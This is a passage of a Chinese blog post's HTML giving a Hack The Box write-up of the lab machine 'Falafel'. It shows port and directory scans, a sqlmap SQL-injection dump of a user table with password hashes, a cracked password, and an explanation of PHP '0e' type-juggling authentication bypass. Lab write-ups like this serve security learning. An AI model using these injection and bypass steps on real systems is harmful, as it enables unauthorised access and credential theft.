@@ -1,0 +1,831 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录文件扫描、SQL注入、php弱比较漏洞、超长图片名称、数据库密码复用、video特权组、disk特权组">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Falafel-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/29/Falafel-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录文件扫描、SQL注入、php弱比较漏洞、超长图片名称、数据库密码复用、video特权组、disk特权组">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/9.webp">
+<meta property="article:published_time" content="2024-05-29T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-31T07:14:03.185Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Falafel-htb-writeup/1.png">
+  
+  
+  
+  <title>Falafel-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Falafel-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-29 23:50" pubdate>
+          2024年5月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          153 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Falafel-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录文件扫描、SQL注入、php弱比较漏洞、超长图片名称、数据库密码复用、video特权组、disk特权组</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2018/06/23/htb-falafel.html</code></p>
+<p>参考链接：<code>https://behindsecurity.com/writeups-en/tricking-php-logic-on-falafel-ctf/</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍：</p>
+<p><code>沙拉三明治难度不大，但需要一些独特的技巧和技巧才能成功利用。虽然提供了许多提示，但需要适当的枚举才能找到它们。</code></p>
+<p>2、获取靶机IP地址：10.10.10.73</p>
+<p>3、获取开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">5000</span>  -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span>              <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-28 10:24 CST</span><br>Warning: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span> giving up on port because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span><br>Host is up (<span class="hljs-number">0.36</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">26.71</span> seconds<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,<span class="hljs-number">80</span> -sC -sV --min-rate=<span class="hljs-number">5000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span> <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-28 10:26 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span><br>Host is up (<span class="hljs-number">0.64</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4u</span>buntu2<span class="hljs-number">.4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">36</span>:c0:<span class="hljs-number">0</span>a:<span class="hljs-number">26</span>:<span class="hljs-number">43</span>:f8:ce:a8:<span class="hljs-number">2</span>c:<span class="hljs-number">0</span>d:<span class="hljs-number">19</span>:<span class="hljs-number">21</span>:<span class="hljs-number">10</span>:a6:a8:e7 (RSA)<br>|   <span class="hljs-number">256</span> cb:<span class="hljs-number">20</span>:fd:ff:a8:<span class="hljs-number">80</span>:f2:a2:<span class="hljs-number">4b</span>:<span class="hljs-number">2b</span>:bb:e1:<span class="hljs-number">76</span>:<span class="hljs-number">98</span>:d0:fb (ECDSA)<br>|_  <span class="hljs-number">256</span> c4:<span class="hljs-number">79</span>:<span class="hljs-number">2b</span>:b6:a9:b7:<span class="hljs-number">17</span>:<span class="hljs-number">4</span>c:<span class="hljs-number">07</span>:<span class="hljs-number">40</span>:f3:e5:<span class="hljs-number">7</span>c:<span class="hljs-number">1</span>a:e9:dd (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>| http-robots.txt: <span class="hljs-number">1</span> disallowed entry <br>|_<span class="hljs-comment">/*.txt</span><br><span class="hljs-comment">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="hljs-comment">|_http-title: Falafel Lovers</span><br><span class="hljs-comment">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-comment">Nmap done: 1 IP address (1 host up) scanned in 40.84 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>4、查看下WEB页面情况</p>
+<p><code>http://10.10.10.73/</code></p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.73/login.php</code></p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//10.10.10.73/robots.txt</span><br>User-agent: *<br>Disallow: <span class="hljs-comment">/*.txt</span><br></code></pre></td></tr></table></figure>
+
+<p>5、经过目录文件枚举发现了一个记事本信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ gobuster -u http:<span class="hljs-comment">//10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 30</span><br><br>Gobuster v1<span class="hljs-number">.4</span><span class="hljs-number">.1</span>              OJ <span class="hljs-title function_">Reeves</span> <span class="hljs-params">(@TheColonial)</span><br>=====================================================<br>=====================================================<br>[+] Mode         : dir<br>[+] Url/Domain   : http:<span class="hljs-comment">//10.10.10.73/</span><br>[+] Threads      : <span class="hljs-number">30</span><br>[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-2.3</span>-medium.txt<br>[+] Status codes : <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span><br>[+] Extensions   : .txt,.php,.html<br>=====================================================<br>/images (Status: <span class="hljs-number">301</span>)<br>/login.php (Status: <span class="hljs-number">200</span>)<br>/profile.php (Status: <span class="hljs-number">302</span>)<br>/index.php (Status: <span class="hljs-number">200</span>)<br>/uploads (Status: <span class="hljs-number">301</span>)<br>/header.php (Status: <span class="hljs-number">200</span>)<br>/assets (Status: <span class="hljs-number">301</span>)<br>/footer.php (Status: <span class="hljs-number">200</span>)<br>/upload.php (Status: <span class="hljs-number">302</span>)<br>/css (Status: <span class="hljs-number">301</span>)<br>/style.php (Status: <span class="hljs-number">200</span>)<br>/js (Status: <span class="hljs-number">301</span>)<br>/logout.php (Status: <span class="hljs-number">302</span>)<br>/robots.txt (Status: <span class="hljs-number">200</span>)<br>/cyberlaw.txt (Status: <span class="hljs-number">200</span>)<br>/connection.php (Status: <span class="hljs-number">200</span>)<br>=====================================================<br></code></pre></td></tr></table></figure>
+
+<p>6、查看该笔记内容</p>
+<p><code>http://10.10.10.73/cyberlaw.txt</code></p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">From: Falafel Network <span class="hljs-title function_">Admin</span> <span class="hljs-params">(admin@falafel.htb)</span><br>Subject: URGENT!! MALICIOUS SITE TAKE OVER!<br>Date: November 25, 2017 3:30:58 PM PDT<br>To: lawyers@falafel.htb, devs@falafel.htb<br>Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700<br>Mime-Version: 1.0<br>X-Spam-Status: score=<span class="hljs-number">3.7</span> tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=<span class="hljs-number">3.1</span><span class="hljs-number">.7</span><br>X-Spam-Level: ***<br>From：Falafel Network Admin（admin@falafel.htb）Subject：URGENT！！恶意网站接管！日期：November <span class="hljs-number">25</span>，<span class="hljs-number">2017</span> <span class="hljs-number">3</span>：<span class="hljs-number">30</span>：<span class="hljs-number">58</span> PM PDT收件人：lawyers@falafel.htb，devs@falafel.htb交付日期：Tue，<span class="hljs-number">25</span> Nov <span class="hljs-number">2017</span> <span class="hljs-number">15</span>：<span class="hljs-number">31</span>：<span class="hljs-number">01</span> <span class="hljs-number">-0700</span> Mime-Version：<span class="hljs-number">1.0</span> X-Spam-Status：score=<span class="hljs-number">3.7</span> tests=DNS_FROM_RFC_POST，HTML_00_10，HTML_MESSAGE，HTML_SHORT_LENGTH version=<span class="hljs-number">3.1</span><span class="hljs-number">.7</span> X-Spam-Level：*<br>A user named <span class="hljs-string">&quot;chris&quot;</span> has informed me that he could <span class="hljs-built_in">log</span> into MY account without knowing the password,<br>then take FULL CONTROL of the website using the image upload feature.<br>We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,<br>so I have no idea how he did it.<br>一个名为“克里斯”的用户告诉我，他可以登录到我的帐户不知道密码，然后采取完全控制的网站使用图像上传功能。我们在登录表单上设置了网络保护，一位高级php开发人员负责过滤上传的URL，所以我不知道他是怎么做到的。<br>Dear lawyers, please handle him. I believe Cyberlaw is on our side.<br>Dear develpors, fix this broken site ASAP.<br>亲爱的律师，请处理他。我相信网络法律站在我们这边亲爱的开发人员，尽快修复这个破碎的网站。<br>	~admin<br></code></pre></td></tr></table></figure>
+
+<p>7、这里还是发现了一些邮箱和用户ID的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">admin@falafel.htb<br>lawyers@falafel.htb<br>devs@falafel.htb<br><br>chris<br></code></pre></td></tr></table></figure>
+
+<p>8、经过枚举，发现登录框这里存在SQL注入漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat <span class="hljs-number">1.</span>txt    <br>POST /login.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.73</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux aarch64; rv:<span class="hljs-number">109.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 29</span><br><span class="hljs-comment">Origin: http://10.10.10.73</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://10.10.10.73/login.php</span><br><span class="hljs-comment">Cookie: PHPSESSID=5qmk32cp5rgg7mhfcoia4m8mk5</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">username=chris&amp;password=chris</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sqlmap -r login-chris.request --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> --batch --<span class="hljs-built_in">string</span> <span class="hljs-string">&quot;Wrong identification&quot;</span> --dump<br><br>.................<br>Table: users<br>[<span class="hljs-number">2</span> entries]<br>+----+--------+----------+---------------------------------------------+<br>| ID | role   | username | password                                    |<br>+----+--------+----------+---------------------------------------------+<br>| <span class="hljs-number">1</span>  | admin  | admin    | <span class="hljs-number">0e462096931906507119562988736854</span>            |<br>| <span class="hljs-number">2</span>  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8            |<br>+----+--------+----------+---------------------------------------------+<br>.....................<br><br></code></pre></td></tr></table></figure>
+
+<p>9、在数据库里发现了账号密码的哈希值，经过破解，也获取到了密码</p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">d4ee02a22fc872e36d9e3751ba72ddc8	md5	juggling<br></code></pre></td></tr></table></figure>
+
+<p>10、使用账号密码，登录后，发现了一些提示信息</p>
+<p><code>http://10.10.10.73/profile.php</code></p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Falafel-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、这里其实有点类似CTF了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">漏洞说明：PHP 类型转换是一种由于 PHP 中比较和类型转换行为不严格而产生的漏洞。在 PHP 中，比较不同类型的变量时，不严格的比较运算符（== 和 !=）可能会导致意外结果。例如，在比较字符串和整数时，PHP 可能会自动将字符串转换为整数进行比较。Behind Security 注意到管理员密码哈希上的前缀“<span class="hljs-number">0</span>e”。<br><br>PHP 中的前缀“<span class="hljs-number">0</span>e”是一种模式，在使用比较运算符（== 和 !=）进行比较时，某些数值中会出现这种模式。此前缀用于以科学计数法表示数字，其中“e”代表 <span class="hljs-number">10</span> 的某个指数的幂。例如，值“<span class="hljs-number">0e123</span>”被解释为“<span class="hljs-number">0</span> * <span class="hljs-number">10</span>^<span class="hljs-number">123</span>”，等于 <span class="hljs-number">0</span>。同样，“<span class="hljs-number">0e456</span>”被解释为“<span class="hljs-number">0</span> * <span class="hljs-number">10</span>^<span class="hljs-number">456</span>”，也等于 <span class="hljs-number">0</span>。以下是一个易受攻击的代码示例，用于说明此漏洞。<br><br><br>php 类型杂耍简介<br>php 类型变换是指 php 尝试通过对变量类型做出假设来解决相等问题。例如，php 将尝试通过取任意初始数字并忽略其余数字来将字符串转换为数字。它还会将以字符开头的字符串视为 <span class="hljs-number">0</span>，将以数字开头然后是 e 的字符串视为指数：<br><br>php &gt; <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;3afa2c1fb515c53a3349c7f8d619abc8&quot;</span> == <span class="hljs-number">4</span>) &#123; echo <span class="hljs-string">&quot;equal&quot;</span>; &#125; <span class="hljs-keyword">else</span> &#123; echo <span class="hljs-string">&quot;not equal&quot;</span>; &#125; <span class="hljs-comment">// 3 != 4</span><br>not equal<br>php &gt; <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;3afa2c1fb515c53a3349c7f8d619abc8&quot;</span> == <span class="hljs-number">4</span>) &#123; echo <span class="hljs-string">&quot;equal&quot;</span>; &#125; <span class="hljs-keyword">else</span> &#123; echo <span class="hljs-string">&quot;not equal&quot;</span>; &#125; <span class="hljs-comment">// 3 != 4</span><br>not equal<br>php &gt; <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;3afa2c1fb515c53a3349c7f8d619abc8&quot;</span> == <span class="hljs-number">3</span>) &#123; echo <span class="hljs-string">&quot;equal&quot;</span>; &#125; <span class="hljs-keyword">else</span> &#123; echo <span class="hljs-string">&quot;not equal&quot;</span>; &#125; <span class="hljs-comment">// 3 == 3</span><br>equal<br>php &gt; <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;aafa2c1fb515c53a3349c7f8d619abc8&quot;</span> == <span class="hljs-number">0</span>) &#123; echo <span class="hljs-string">&quot;equal&quot;</span>; &#125; <span class="hljs-keyword">else</span> &#123; echo <span class="hljs-string">&quot;not equal&quot;</span>; &#125; <span class="hljs-comment">// 0 == 